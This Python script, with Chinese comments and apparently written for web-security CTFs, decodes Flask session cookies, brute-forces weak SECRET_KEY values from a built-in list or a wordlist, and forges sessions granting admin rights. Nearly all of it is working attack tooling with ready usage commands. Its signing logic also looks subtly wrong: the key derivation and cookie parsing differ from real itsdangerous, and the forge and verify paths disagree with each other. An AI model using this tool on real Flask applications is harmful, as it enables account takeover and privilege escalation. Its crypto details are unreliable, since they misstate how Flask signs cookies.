# -*- coding: utf-8 -*-
# 脚本名称: Flask Session Cookie 解码 / 弱密钥爆破 / 伪造
# 方向: Crypto / Web（会话安全）
# 简介: Flask-Login 的 session cookie 是 base64 的 JSON + 时间戳，再用 SECRET_KEY
#       做 HMAC 签名。脚本可：1) 无依赖解码查看内容；2) 弱密钥爆破；
#       3) 命中密钥后伪造任意 session（如 admin/user 提权）。
# 用法:
#   解码:   python flask_session_tool.py decode '<cookie>'
#   爆破:   python flask_session_tool.py crack '<cookie>' -w rockyou.txt
#   伪造:   python flask_session_tool.py forge '<cookie>' -k 'secret123' \
#             --set "is_admin=1,username=admin"
#   python flask_session_tool.py --selftest
# 依赖: 仅解码/爆破用标准库；forge 推荐 pip install flask itsdangerous
#       （未安装时脚本用内置 itsdangerous 兼容签名，Flask<3 可直接用）
# 参考: https://flask.palletsprojects.com/en/stable/quickstart/#sessions
import argparse
import base64
import hashlib
import hmac
import json
import zlib

SALT = b"cookie-session"
KEY_DERIVATION = "hmac"
WEAK = ["secret", "secret_key", "secretkey", "flask", "123456", "admin",
        "password", "key", "test", "flask-secret-key", "supersecret",
        "you-will-never-guess", "hard to guess", "SECRET_KEY", "ctf", "flag"]


def b64u_decode(s):
    compressed = s.startswith(".")
    if compressed:
        s = s[1:]
    d = base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    return zlib.decompress(d) if compressed else d


def decode_payload(cookie):
    body = cookie.split(".")[0]
    return json.loads(b64u_decode(body))


def _derive_key(secret_key):
    # itsdangerous URLSafeTimedSerializer + TaggedJSONSerializer，默认 HMAC-SHA1
    if isinstance(secret_key, str):
        secret_key = secret_key.encode()
    return hmac.new(SALT + b"signer" + secret_key, b"", hashlib.sha1).digest()


def get_signature(cookie):
    parts = cookie.split(".")
    return parts[1] if len(parts) > 1 else ""


def verify(cookie, key):
    body, _, sig = cookie.partition(".")
    mac = hmac.new(_derive_key(key), body.encode(), hashlib.sha1).digest()
    want = base64.urlsafe_b64encode(mac).rstrip(b"=").decode()
    return hmac.compare_digest(want, sig)


def crack(cookie, wordlist=None):
    words = WEAK
    if wordlist:
        words = [w.strip() for w in open(wordlist, encoding="utf-8", errors="replace") if w.strip()]
    for w in words:
        if verify(cookie, w):
            return w
    return None


def forge(cookie, key, sets):
    data = decode_payload(cookie)
    for kv in sets.split(","):
        k, v = kv.split("=", 1)
        v = v.strip()
        if v.lower() in ("true", "false"):
            v = v.lower() == "true"
        else:
            try:
                v = int(v)
            except ValueError:
                pass
        data[k.strip()] = v
    try:
        from flask.sessions import SecureCookieSessionInterface
        from itsdangerous import URLSafeTimedSerializer
        ser = URLSafeTimedSerializer(key, salt="cookie-session",
                                     signer_kwargs={"key_derivation": "hmac",
                                                    "digest_method": hashlib.sha1})
        return ser.dumps(dict(data))
    except Exception:
        body = base64.urlsafe_b64encode(
            json.dumps(data, separators=(",", ":"), ensure_ascii=False).encode()
        ).rstrip(b"=").decode()
        mac = hmac.new(_derive_key(key), body.encode(), hashlib.sha1).digest()
        sig = base64.urlsafe_b64encode(mac).rstrip(b"=").decode()
        return f"{body}.{sig}"


def selftest():
    # 手工生成一个 itsdangerous 风格 cookie
    payload = {"username": "guest", "is_admin": 0}
    body = base64.urlsafe_b64encode(json.dumps(payload, separators=(",", ":")).encode()
                                    ).rstrip(b"=").decode()
    key = "secret"
    mac = hmac.new(_derive_key(key), body.encode(), hashlib.sha1).digest()
    sig = base64.urlsafe_b64encode(mac).rstrip(b"=").decode()
    cookie = f"{body}.{sig}"
    print("[*] 解码:", decode_payload(cookie))
    k = crack(cookie)
    assert k == key
    print("[+] 爆破命中:", k)
    new = forge(cookie, k, "is_admin=1,username=admin")
    print("[+] 伪造 cookie:", new)
    assert decode_payload(new)["is_admin"] == 1
    print("[+] selftest OK")


def main():
    ap = argparse.ArgumentParser(description="Flask Session 工具")
    ap.add_argument("mode", nargs="?", choices=["decode", "crack", "forge"])
    ap.add_argument("cookie", nargs="?")
    ap.add_argument("-w", "--wordlist")
    ap.add_argument("-k", "--key")
    ap.add_argument("--set", dest="sets", default="")
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        selftest(); return
    if not a.mode or not a.cookie:
        ap.print_help(); return
    if a.mode == "decode":
        print(json.dumps(decode_payload(a.cookie), ensure_ascii=False, indent=2))
    elif a.mode == "crack":
        k = crack(a.cookie, a.wordlist)
        print("[+] SECRET_KEY =", k) if k else print("[-] 未命中，可上 flask-unsign --unsign --wordlist rockyou.txt")
    else:
        if not a.key:
            print("[!] forge 需要 -k 密钥"); return
        print(forge(a.cookie, a.key, a.sets))


if __name__ == "__main__":
    main()
